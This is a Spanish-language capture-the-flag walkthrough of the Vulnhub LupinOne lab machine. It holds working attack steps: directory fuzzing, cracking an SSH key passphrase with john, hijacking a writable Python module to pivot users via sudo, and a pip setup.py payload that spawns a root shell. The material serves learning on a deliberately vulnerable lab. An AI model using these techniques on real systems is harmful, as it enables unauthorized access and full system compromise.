---
title: Vulnhub - LupinOne
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'LFI to RCE', 'Path Hijacking']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/LupinOne/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: LupinOne Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **LFI to RCE, Path Hijacking**

### Fase de Reconocimiento 🧣

Identificamos la dirección IP de la **`Máquina LupinOne`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.24  08:00:27:56:a5:5c       PCS Systemtechnik GmbH
```

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

  ![](/assets/images/Vulnhub/Easy/LupinOne/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

  ![](/assets/images/Vulnhub/Easy/LupinOne/02-versions.png)

c. Antes de fuzzear con herramientas como **wfuzz, gobuster o dirbuster** usaremos el script **http-enum** de nmap

```bash
root@kali> nmap -p80 --script http-enum <IP>

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|_  /manual/: Potentially interesting folder
```

* En el fichero **robots.txt** vemos esto:

  ```bash
  User-agent: *
  Disallow: /~myfiles
  ```

* Si visitamos este directorio veremos un Error 404 por lo cual fuzzearemos por otro posible directorio.

  ```bash
  root@kali> wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt 'http://<IP>/~FUZZ/'

  000003667:   200        5 L      54 W       331 Ch      "secret" 
  ```

d. Vemos el contenido del fichero **`secret`**

```txt
Hello Friend, Im happy that you found my secret directory, I created like this to share with you my create ssh private key file,
Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
I'm smart I know that.
Any problem let me know
Your best friend icex64
```

* Fuzzeamos por múltiples extensiones de archivos.

  ```bash
  root@kali> wfuzz -c -t 100 --hc=404 --hh=279 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -z list,txt-php-zip 'http://<IP>/~secret/.FUZZ.FUZ2Z'

  000068287:   200        1 L      1 W        4689 Ch     "mysecret"
  ```

e. El contenido de este archivo **http://<IP>/~secret/.mysecret.txt** lo pasamos a [Cyberchef](https://gchq.github.io/CyberChef)

![](/assets/images/Vulnhub/Easy/LupinOne/03-cyberchef.png)

* Al pasar el contenido por **Base58** obtenemos una clave id_rsa encriptada.

* Extraemos el hash de la clave **id_rsa** y lo crackeamos con este [diccionario](https://github.com/drtychai/wordlists/blob/master/fasttrack.txt) (Esto nos dan como pista en **/~secret/**)

  ```bash
  atacante@kali> chmod 600 id_rsa
  atacante@kali> ssh2john id_rsa > hash
  atacante@kali> john hash -w=fasttrack.txt

  P@55w0rd!
  ```

f. Nos autenticamos en el servicio **`ssh`**

```bash
atacante@kali> ssh icex64@192.168.100.24 -i id_rsa

icex64@LupinOne:~$ hostname -I
192.168.100.24 
```

### Escalada de Privilegios 💹

a. Listamos privilegios presentes en el archivo sudoers

```bash
icex64@LupinOne:~$ sudo -l

  (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

* **`/home/arsene/heist.py`**

  ```py
  import webbrowser

  print ("Its not yet ready to get in action")

  webbrowser.open("https://empirecybersecurity.co.mz")
  ```

b. Como no tenemos la capacidad de crear ficheros en el directorio **`/home/arsene`**, vemos si somos capaces de escribir en el fichero del módulo **`webbrowser`**

```bash
icex64@LupinOne:~$ find / -writable 2>/dev/null | grep -vE "^/proc|^/sys"

<SNIP>
/usr/lib/python3.9/webbrowser.py
<SNIP>
```

* Cambiamos el contenido de este fichero por 

  ```bash
  import os
  os.system("bash")
  ```

  > Esto con el fin de que al momento de ejecutar el script **heist.py**, el comando sea ejecutado por el usuario **`arsene`** y esto nos daría una bash.


* Ejecutamos el script

  ```bash
  icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
  arsene@LupinOne:/home/icex64$
  ```

* Listamos privilegios que tengamos con este usuario

  ```bash
  arsene@LupinOne:/home/icex64$ sudo -l

    (root) NOPASSWD: /usr/bin/pip
  ```

c. Escalamos privilegios con [Gtfobins - pip](https://gtfobins.github.io/gtfobins/pip/#sudo)

```bash
arsene@LupinOne:/home/icex64$ TF=$(mktemp -d)
arsene@LupinOne:/home/icex64$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
arsene@LupinOne:/home/icex64$ sudo pip install $TF
Processing /tmp/tmp.bD4rZoIdVG
# whoami
root
```